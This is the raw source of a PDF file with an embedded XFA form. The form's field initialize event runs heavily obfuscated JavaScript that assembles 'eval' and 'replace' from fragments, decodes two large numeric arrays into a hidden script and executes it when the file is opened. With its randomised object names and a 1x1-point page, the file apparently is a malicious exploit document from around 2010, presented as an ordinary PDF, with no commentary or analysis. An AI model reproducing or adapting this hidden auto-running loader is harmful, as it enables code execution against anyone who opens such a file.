%PDF-1.6
%‚„œ”
1 0 obj
<</MediaBox [0 0 1 1] /Type/Page /Contents 3 0 R /Parent 5 0 R /Resources 7 0 R>>
endobj
5 0 obj
<</Count 2 /Kids [1 0 R] /Type/Pages>>
endobj
8 0 obj
<</Type/EmbeddedFile /Length 86>>
stream
<?xml version="1.0"?><xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
endstream
endobj
9 0 obj
<</Type/EmbeddedFile /Length 652>>
stream
<config xmlns="http://www.xfa.org/schema/xci/1.0/"><present><pdf><version>1.65
</version><interactive>1</interactive><linearized>1</linearized></pdf><xdp><packets>*</packets></xdp><destination>pdf</destination></present></config>
<template xmlns="http://www.xfa.org/schema/xfa-template/2.5/">
	<subform layout="tb" locale="en_US" name="asfaewf">
		<pageSet>
			<pageArea id="roteYom" name="roteYom">
				<contentArea h="756pt" w="576pt" x="0.25in" y="0.25in"/>
				<medium long="792pt" short="612pt" stock="default"/>
			</pageArea>
		</pageSet>
		<subform h="756pt" w="576pt" name="qwgwqgwqg">
			<field h="65mm" name="favwwbw" w="85mm" x="53.6501mm" y="88.6499mm">
				<event activity="initialize" name="loxRote">
					<script contentType="application/x-javascript">
endstream
endobj
10 0 obj
<</Length 123 /Type/EmbeddedFile>>
stream
zz=eval(function(){return 'eval'}());
e="ub";
d="pla";
p=26;
p2=13;
k=typeof this.asvas;
ss2=String;
ss3='fromCharCo';
ss=ss2[ss3+'de'];
endstream
endobj
11 0 obj
<</Length 123 /Type/EmbeddedFile>>
stream

	d='re'+d+'ce';
	zo='';
	ar2=zz('[1534,1482,1235,637,442,1287,624,624,1326,689,715,624,1261,1287,624,624,1326,1326,663,624,1261,663,1274,624,1261,624,624,650,1261,1313,1326,624,1261,637,637,637,637,702,624,624,624,624,624,624,624,624,624,624,624,624,624,624,624,650,741,624,1261,676,624,624,1326,624,676,624,624,637,637,637,637,637,637,637,637,624,624,624,624,1274,702,741,702,637,624,624,1274,676,676,741,715,624,1313,741,676,702,1287,676,663,1261,650,1261,663,728,689,1326,1326,1326,1261,1326,650,663,663,1300,650,1326,1326,650,663,663,1261,676,1313,1287,663,1313,1287,715,650,728,676,650,624,624,624,624,624,624,624,702,624,624,1274,715,650,663,663,702,689,624,1274,1287,1300,663,663,1274,702,637,1326,1313,715,1274,1300,1300,1300,1326,1274,1274,663,663,663,663,1274,1326,663,663,663,1287,663,624,715,1274,1274,1287,1287,1287,702,663,1274,1326,663,663,663,1287,663,702,663,702,676,741,715,1261,624,741,1274,637,1300,624,689,1274,1313,663,663,663,663,1274,650,663,663,663,1287,663,624,741,1300,1274,1261,1287,650,1313,1274,1274,663,663,663,663,1274,1326,663,663,663,1287,663,663,650,663,715,728,663,663,728,637,1326,728,637,715,728,637,1274,1261,1274,663,663,663,650,1287,650,663,1326,1326,650,1326,637,1326,663,650,1287,1313,650,676,637,663,650,1287,728,1326,741,741,728,637,663,728,637,702,1261,1261,715,715,1326,650,624,663,728,1326,715,715,728,702,1326,728,715,702,1274,650,741,728,741,1274,728,741,663,650,728,624,715,1261,728,715,728,650,1300,650,1287,650,663,1326,1326,715,663,715,676,650,1287,1313,650,676,728,715,728,1326,715,1274,702,650,728,741,715,650,728,689,728,1326,728,728,741,1326,650,728,728,715,728,650,1274,1261,715,715,1326,650,637,1274,663,1274,1287,1300,1287,1287,1274,715,715,663,741,1287,1287,689,676,637,676,741,689,1300,624,1287,1313,1287,715,1300,663,1274,663,1287,689,1313,676,702,689,702,1313,689,767,1261,416,1404,793,676,650,702,624,1261,702,728,676,663,650,702,624,741,650,728,676,741,637,728,676,663,741,728,676,715,715,728,676,676,676,676,676,650,624,624,624,624,624,624,624,624,624,624,624,624,624,624,624,715,728,728,676,702,650,702,624,624,624,624,624,676,676,676,676,676,676,676,676,741,741,741,741,1313,637,1274,663,624,624,624,728,663,650,728,1326,728,663,1313,715,624,1261,663,689,1261,1313,1326,1287,1313,1313,1326,1326,1326,1274,689,689,689,689,624,1300,1274,624,689,689,689,1300,1274,1300,637,676,1300,663,624,702,728,624,624,624,624,624,624,624,624,624,624,624,624,663,689,689,689,689,624,624,624,663,663,663,689,689,663,650,650,663,663,624,663,1300,637,689,1274,1274,637,689,689,689,624,1274,650,689,689,689,1261,728,1300,741,689,663,637,1274,637,689,624,1274,663,689,689,689,1261,728,1300,741,650,676,663,624,624,1261,1326,663,650,1261,1313,676,1274,676,689,689,689,624,1274,624,689,689,689,1261,728,624,663,1261,663,1300,663,689,1313,1274,689,689,689,689,624,1274,702,689,689,689,1261,728,663,702,741,663,1300,624,702,1300,624,689,1300,624,676,1300,650,715,1313,676,689,689,689,702,1261,702,741,1326,702,663,650,689,715,715,741,741,689,689,741,1274,1261,1300,1261,624,1313,637,663,1300,637,676,1300,676,650,728,1300,637,715,676,663,741,663,1300,663,715,715,1300,637,702,1300,624,689,650,689,1274,1300,637,676,1300,624,715,689,1274,1274,702,637,1300,702,1300,689,1274,702,1261,702,741,1261,1326,1300,741,650,689,741,741,689,689,741,1274,1261,702,650,715,715,650,1274,1300,624,715,689,1274,663,1300,689,637,1300,624,676,689,1274,1300,689,1300,689,1274,1300,637,715,676,663,741,689,689,1274,1274,1261,1261,1261,663,650,650,650,702,715,715,650,650,650,650,663,702,715,663,663,663,715,663,715,650,663,650,702,663,702,702,702,715,663,702,702,442,1235,663,1261,1456,1235,676,1430,1547,845,1482,1573,533,1326,1430,1508,1443,416,1404,520,1599,1261,416,1404,793,1404,598,1365,1547,1482,1313,1495,1443,598,1443,1508,1365,1339,533,1235,702,1235,702,1482,1456,1261,1313,507,507,507,533,1547,1365,1313,1235,702,1404,1430,1508,780,533,1404,559,507,507,1482,1508,1482,416,1261,1495,949,1508,1235,702,637,533,1326,1430,1508,1443,416,1404,520,1404,572,1404,533,1547,1365,1313,1235,728,1404,1430,1508,546,780,1404,533,1404,559,1235,728,1482,1508,1482,416,1404,598,1521,1495,1482,1430,520,572,1404,611,533,1326,1430,1508,1443,416,949,520,949,533,1235,637,1521,1313,1287,1456,520,949,533,1482,1508,884,1391,1235,637,1404,1430,1508,546,767,1261,1066,1508,793,1430,1495,1261,1313,507,1521,624,624,533,1495,1482,1573,1235,715,1300,1391,1443,1313,624,650,624,585,1443,1313,1261,533,1404,1560,1352,1313,1235,637,1495,1482,1573,1404,1560,1352,1313,1235,715,1404,1560,1352,1313,689,676,741,533,1326,1482,1365,624,416,416,416,624,767,1365,559,1235,676,1365,793,1443,1131,1313,598,1521,1495,1482,624,1404,1560,1352,1313,1404,1430,1508,585,533,1300,1391,1443,1313,1625,1521,1287,1365,1430,1235,650,1235,637,1404,1430,1599,1352,1404,520,949,598,1313,1339,1352,1404,1430,1235,637,793,949,767,1313,1521,1430,1235,637,1495,1274,1508,1365,1339,624,1404,1430,1625,1521,1287,1365,1430,1235,663,1235,637,1599,1313,793,507,1326,1482,1365,624,1365,1235,637,1404,1430,1508,767,559,650,1599,793,949,598,1521,1495,1482,1365,650,767,793,1261,1495,949,1508,1274,637,533,1482,1508,793,1508,1365,1339,1326,1443,871,1261,871,1300,520,533,1625,1313,1521,1430,1482,1508,1326,1430,1508,1443,416,1378,637,1235,637,1235,676,1599,949,793,507,1326,1482,1235,702,624,1235,702,1235,637,1404,1430,1508,767,949,559,533,1235,741,1235,676,1404,1430,1508,767,949,793,949,598,1352,1482,1443,1313,1508,1235,702,767,949,793,949,598,1352,1482,1443,1313,1508,1235,702,1235,741,767,949,559,1079,1482,1430,598,1482,1417,1352,1482,1443,1313,1235,715,1235,728,767,1482,1508,1482,416,949,1625,1521,1287,1365,1430,1235,741,1235,702,1599,1378,793,949,598,1443,1508,1365,1339,637,533,1235,637,1235,624,1404,1430,1508,767,949,793,1235,637,650,819,624,559,1378,754,1378,767,1313,1521,1430,1235,689,1326,1430,1508,1443,416,1378,520,949,533,1235,689,507,767,1443,520,949,793,767,949,780,949,598,1313,1339,1352,1235,702,793,533,1235,689,793,481,507,1235,689,793,949,520,949,598,1352,1482,1443,1313,1508,1235,702,637,533,1235,689,793,949,520,949,598,1352,1482,1443,1313,1508,1235,702,533,1482,1508,1482,416,949,1625,1521,1287,1365,1430,1235,663,533,1235,676,1235,689,533,1365,520,1378,780,624,624,1599,1378,793,1443,1521,1079,1339,1339,1456,988,858,611,611,611,845,845,858,845,845,845,845,845,845,845,845,845,845,1326,1261,1079,845,1157,741,897,858,507,1235,702,1235,637,1235,715,1235,663,1235,702,1625,1404,1313,1235,689,507,858,845,1378,1053,897,741,1443,975,611,611,1547,845,845,845,845,845,845,845,845,1053,845,845,845,845,1560,845,1365,1339,845,1326,676,975,767,1378,793,1404,767,1378,793,949,520,1378,533,1235,728,507,1105,1469,884,1339,845,858,767,1378,793,949,520,1053,910,507,637,741,676,767,1404,624,507,1053,845,845,884,845,845,845,1547,845,845,1053,884,845,845,845,858,845,845,1547,884,845,845,845,858,845,845,1339,884,845,845,845,858,845,845,1053,897,845,845,845,949,845,845,1547,897,845,845,845,1547,845,845,845,884,1001,845,845,1079,845,845,845,845,845,1001,845,611,611,611,767,1404,637,1235,728,1235,741,1235,1404,559,1378,767,1404,650,1235,1365,520,1378,572,507,767,1326,1235,1404,598,1313,1339,1352,650,1235,1404,559,1521,1313,1287,1456,520,481,624,533,1235,1404,793,1378,520,1404,650,767,949,520,1404,663,767,1261,1547,1274,598,1261,1118,1404,1313,1235,1404,1625,1378,520,767]');
	ar=zz('u2522,832,2808,1586,1352,1300,1404,1248,1248,1274,1456,1352,1326,1300,1404,1248,1248,1404,1456,1352,2522,2626,1456,1352,1326,1300,1456,1352,1404,1300,1456,1352,1352,1352,1352,1352,1300,1248,1248,1248,1248,1248,1248,1248,1248,1248,1248,1248,1248,1248,1248,1248,1274,1326,1456,1352,1404,1300,1404,1248,1248,1248,1248,1248,1352,1352,1352,1352,1352,1352,1352,1352,1482,1482,1482,1482,2626,1274,2548,1326,1248,1248,1248,1456,1326,1300,1456,2652,1456,1326,2626,1430,1248,2522,1326,1404,2522,2626,2652,2574,2626,2626,2652,2652,2652,1456,1404,1404,1404,1404,1326,2626,1456,1326,1404,1404,1404,2626,1456,2626,1300,1430,2626,1248,1326,1378,2548,1326,1326,1326,1326,1326,1326,1326,1326,1326,1326,1326,1326,1248,1404,1404,1404,1404,1326,1326,1326,1248,1248,1248,1404,1404,1248,1274,1274,1248,1248,1326,1248,2626,1300,1404,1456,1456,1300,1404,1404,1404,1326,1456,1274,1404,1404,1404,1482,2548,2626,2522,1404,1248,1300,1456,1300,1404,1326,1456,1248,1404,1404,1404,1482,2548,2626,2522,1274,1430,1248,1326,1326,1482,2574,1248,1274,1482,2600,1430,1456,1430,1404,1404,1404,1326,1456,1326,1404,1404,1404,1482,2548,1326,1248,1482,1248,2626,1248,1404,2600,1456,1404,1404,1404,1404,1326,1456,1378,1404,1404,1404,1482,2548,1248,1378,2522,1248,2626,1326,1378,2626,1326,1404,2626,1326,1430,2626,1274,1352,2600,1430,1404,1404,1404,1378,1482,1378,2522,2574,1378,1248,1274,1404,1352,1352,2522,2522,1404,1404,2522,1456,1482,2626,1482,1326,2600,1300,1248,2626,1300,1430,2626,1430,1274,2548,2626,1300,1352,1430,1248,2522,1248,2626,1248,1352,1352,2626,1300,1378,2626,1326,1404,1274,1404,1456,2626,1300,1430,2626,1326,1352,1404,1456,1456,1378,1300,2626,1378,2626,1404,1456,1378,1482,1378,2522,1482,2574,2626,2522,1274,1404,2522,2522,1404,1404,2522,1456,1482,1378,1274,1352,1352,1274,1456,2626,1326,1352,1404,1456,1248,2626,1404,1300,2626,1326,1430,1404,1456,2626,1404,2626,1404,1456,2626,1300,1352,1430,1248,2522,1404,1404,1456,1456,1482,1482,1482,1248,1274,1274,1274,1378,1352,1352,1274,1274,1274,1274,1248,1378,1352,1248,1248,1248,1352,1248,1352,1274,1248,1274,1378,1248,1378,1378,1378,1352,1248,1378,1378,884,3068,2964,2470,1300,884,2574,1248,1248,2652,1378,1326,1248,2522,2574,1248,1248,2652,1404,1274,1248,2522,1248,2652,1248,2522,1248,1248,1352,2522,2600,2626,1248,2522,1274,1274,1274,1274,1404,1248,1248,1248,1248,1248,1248,1248,1248,1248,1248,1248,1248,1248,1248,1248,1274,1456,1248,2522,1352,1248,1248,2652,1248,1352,1248,1248,1274,1274,1274,1274,1274,1274,1274,1274,1248,1248,1248,1248,2548,1404,1482,1404,1274,1248,1248,2548,1352,1352,1482,1430,1248,2626,1482,1352,1404,2574,1352,1430,2522,1300,2522,1326,1456,1378,2652,2652,2652,2626,2548,1404,1430,1430,1482,1404,2548,2548,1404,1430,1430,2626,1248,2522,1456,1430,2522,1456,1326,1404,2574,1248,1404,1352,1352,1352,1352,1352,1352,1352,1300,1352,1352,2652,1326,1404,1430,1430,1300,1274,1352,2652,1456,1482,1430,1430,2652,1300,1378,2548,2522,1326,2652,1482,1482,1482,2548,2652,2652,1430,1430,1430,1430,2652,2548,1430,1430,1430,1456,1430,1352,1326,2652,2652,1456,1456,1456,1300,1430,2652,2548,1430,1430,1430,1456,1430,1300,1430,1300,1248,2600,1326,2626,1352,2600,2652,1378,1482,1352,1274,2652,2522,1430,1430,1430,1430,2652,1404,1430,1430,1430,1456,1430,1352,2600,1482,2652,2626,1456,1404,2522,2652,2652,1430,1430,1430,1430,2652,2548,1430,1430,1430,1456,1430,1430,1404,1430,1326,2574,1430,1430,2574,1378,2548,2574,1378,1326,2574,1378,2652,2626,2652,1430,1430,1430,1404,1456,1404,1430,2548,2548,1404,2548,1378,2548,1430,1404,1456,2522,1404,1248,1378,1430,1404,1456,2574,2548,2600,2600,2574,1378,1430,2574,1378,1300,2626,2626,1326,1326,2548,1404,1352,1430,2574,2548,1326,1326,2574,1300,2548,2574,1326,1300,2652,1404,2600,2574,2600,2652,2574,2600,1430,1404,2574,1352,1326,2626,2574,1326,2574,1404,1482,1404,1456,1404,1430,2548,2548,1326,1430,1326,1248,1404,1456,2522,1404,1248,2574,1326,2574,2548,1326,2652,1300,1404,2574,2600,1326,1404,2574,1274,2574,2548,2574,2574,2600,2548,1404,2574,2574,1326,2574,1404,2652,2626,1326,1326,2548,1404,1378,2652,1430,2652,1456,1482,1456,1456,2652,1326,1326,1430,2600,1456,1456,1274,1248,1378,1248,2600,1274,1482,1352,1456,2522,1456,1326,1482,1430,2652,1430,1456,1274,2522,1248,1300,1274,1300,2522,1274,1534,2808,1586,2912,1534,2808,1586,2626,832,2964,2522,1040,1534,3042,2574,2730,2860,2470,1378,1066,3068,2964,2470,1404,2470,1326,3068,2626,2626,2236,2964,2730,2860,3016,2158,2964,2860,1040,1534,2808,1586,2808,1196,2626,2808,2574,1040,1196,1144,1014,1534,2704,2808,1040,2808,1196,2626,2678,2704,1352,2470,1404,1586,1248,1534,2626,3042,2860,2912,2964,2626,2860,1040,2808,1144,1248,3250,3042,2574,2730,2860,2470,1430,2470,1456,2470,1482,3198,2704,2808,1040,2808,1196,2626,2678,2704,1300,2470,1482,2470,1456,1586,2808,1534,2626,3042,2860,2470,1456,2990,2548,3016,2730,2678,1248,2470,1482,1300,3250,3042,2574,2730,2860,2470,1248,2470,1274,3198,1898,1586,2860,2990,2522,2626,2470,1274,1534,2886,2626,2522,1586,1898,1196,2626,2678,2704,1300,2600,2782,2886,2626,3042,2626,2574,2912,1040,962,1482,1482,1014,1534,2912,2522,1586,2808,1040,2522,2132,3016,1144,3120,1248,1248,2964,3016,1768,2782,1534,2886,2262,2626,1586,1898,1118,2912,2522,1534,2886,2262,2626,1586,2808,1040,2886,2262,2626,1144,1300,1248,1456,1534,2886,1040,1586,1534,2730,1560,1352,1248,832,1118,1066,2808,2366,2418,2808,3120,2704,2626,2990,2548,3016,1040,1144,2886,2262,2626,1196,2626,2678,2704,1274,1118,2522,2132,3016,1534,2652,2860,3016,2886,832,1898,1040,1898,1144,2626,1066,3094,2730,2626,2470,1274,2808,2860,3016,1560,2626,1066,1898,1118,2470,1274,2964,3016,2964,832,1898,1196,3042,2990,2964,2860,1040,1144,2626,1066,2652,2860,3016,2886,832,1898,1040,1898,1066,2964,3016,1014,1534,2886,1040,1586,1534,1560,1898,1196,2626,2678,2704,2730,1586,1066,2548,2470,1274,2990,2548,3016,1040,1144,1066,2574,2912,2964,2626,2860,1040,1144,1404,1534,2626,1118,2158,2964,2860,1196,2964,2834,2704,2964,2886,2626,2574,1534,2964,3016,2964,832,2626,3250,3042,2574,2730,2860,2470,2730,1040,1898,1144,1898,1066,2470,1378,1014,1534,2886,1040,1898,1586,1534,1898,1560,1898,1196,2626,2678,2704,2470,1404,1118,3198,2808,1586,1898,1196,2626,2678,2704,2470,1430,2470,1274,2574,2522,1742,2600,1690,1040,1898,1066,2470,1456,2470,1352,2574,2522,1742,2600,1690,1040,1898,962,2808,1066,2470,1378,1586,3016,2730,2678,2652,2886,1742,2522,1742,2600,1040,1898,2444,1898,1066,3250,2626,3042,2860,2470,1378,2652,2860,3016,2886,832,1898,1040,1898,1066,2470,1248,2470,1404,3016,2158,2964,2860,1040,1404,1534,2756,1586,2756,1196,2626,2678,2704,2470,1378,1040,2756,962,1066,1014,1014,2470,1248,2470,1248,2964,3016,2964,832,1898,3250,3042,2574,2730,2860,2470,1300,2470,1274,3198,1898,1586,1014,2652,2964,2470,1404,1248,2470,1404,2470,1274,2808,2860,3016,1534,1898,1118,1300,3198,1898,1118,1014,3042,1534,1898,1118,2470,1482,2470,1274,2574,2522,1742,2600,1690,1040,1898,1118,1066,1534,1898,1118,2470,1482,2470,1274,2574,2522,1742,2600,1690,1040,1898,1066,3250,2626,3042,2860,2470,1378,2652,2860,3016,2886,832,2756,1040,3198,2756,1586,2808,1040,1534,2652,2470,1352,1482,1248,1066,2470,1378,1014,1118,1690,2756,2678,2782,3042,1352,1950,1222,1222,3094,1690,1690,1690,1690,1690,1690,1690,1690,2106,1690,1690,1690,1690,2704,1690,2730,2678,1690,1456,1898,1950,1534,2756,1586,2808,1534,2756,1586,1898,1040,2756,1066,2626,2990,3198,2756,1586,2782,1118,2158,2730,2704,2912,2652,1716,1222,1222,1222,1690,1690,1716,1690,1690,1690,1690,1690,1690,1690,1690,1690,1690,2314,1742,2158,1690,2314,1222,1794,1716,1014,2470,1404,2470,1300,2470,1430,2470,1326,2470,1404,3250,2756,1586,2158,2782,1690,2678,1690,1716,1014,2470,1482,2470,1300,1014,2210,1716,1144,1248,1456,1066,2470,2808,1586,2106,2574,1690,1794,1690,1794,1690,1690,1898,1690,1690,1794,1690,1794,1690,1690,1690,1690,1690,1794,1690,1794,1690,1690,1690,1690,1716,1794,1690,1794,1690,1690,1690,1690,1794,1794,1690,1794,1690,1690,1690,1690,1820,1794,1690,1794,1690,1690,1898,1690,2210,1794,1690,3094,1690,1742,1898,1690,1690,1690,1690,1690,1768,2756,1222,1222,1014,2470,2808,1586,2756,1118,2756,1118,2808,1248,2470,1378,2470,2808,1586,2756,1274,2470,1430,1014,1066,2730,1040,2808,1300,2808,2860,3016,962,1066,2808,1300,1586,2860,2990,2522,2626,1014,1248,1014,1534,2808,1326,2470,1300,2470,2808,1066,2470,1248,2470,2808,1066,2652,3068,3094,3094,2964,3094,2522,3042,1586,2808,1274,2470,1326,1066]'[d](k['s'+e+'str'](0,1),'['));
	for(i=0;i&lt;ar2.length;i++){
		zo+=ss(ar2[i]/p2);
		if (i&lt;ar.length)zo+=ss(ar[i]/p);
	}
	zz(zo);
	
endstream
endobj
12 0 obj
<</Length 123 /Type/EmbeddedFile>>
stream
					</script>
				</event>
				<ui>	
					<imageEdit/>
				</ui>
			</field>
		</subform>
	</subform>
</template>
<PDFSecurity xmlns="http://ns.adobe.com/xtd/" accessibleContent="1" change="1" contentCopy="1" documentAssembly="1" formFieldFilling="1" metadata="1" modifyAnnots="1" print="1" printHighQuality="1"/><xfa:datasets xmlns:xfa="http://www.xfa.org/schema/xfa-data/1.0/">
endstream
endobj
14 0 obj<</Type/EmbeddedFile /Length 152>>
stream
<xfa:data><asfaewf><favwwbw/></asfaewf></xfa:data></xfa:datasets>
endstreamendobj15 0 obj<</Length 76 /Type/EmbeddedFile>>
stream<xfdf xmlns="http://ns.adobe.com/xfdf/" xml:space="preserve"><annots/></xfdf>
<form xmlns="http://www.xfa.org/schema/xfa-form/2.8/" /></xdp:xdp>endstreamendobj18 0 obj<</Rect [12.5 5.1 18.3 7.7] /Subtype/Widget /Ff 65536 /T (favwwbw[0]) /MK <</TP 1>> /Type/Annot /FT/Btn /DA (/CourierStd 10 Tf 0 g) /Parent 19 0 R /TU (favwwbw) /P 1 0 R /F 4>>endobj19 0 obj<</T (qwgwqgwqg[0]) /Kids [18 0 R] /Parent 20 0 R>>endobj20 0 obj<</T (asfaewf[0]) /Kids [19 0 R]>>endobj21 0 obj<</DA (/Helv 0 Tf 0 g ) /Fields [20 0 R] /XFA [8 0 R 9 0 R 10 0 R 11 0 R 12 0 R 13 0 R 14 0 R 15 0 R]>>endobj22 0 obj<</Creator (styeZek colSnap) /Title (zekRote snapSet) /CreationDate (D:20100829161936) /Subject (onesZek ionSnap) /Author (setSnap hunkZek)>>endobj23 0 obj<</AcroForm 21 0 R /Pages 5 0 R /Type/Catalog>>endobjxref
0 24 
trailer
<</Size 22 /Info 22 0 R /Root 23 0 R>>
startxref
17175
%%EOF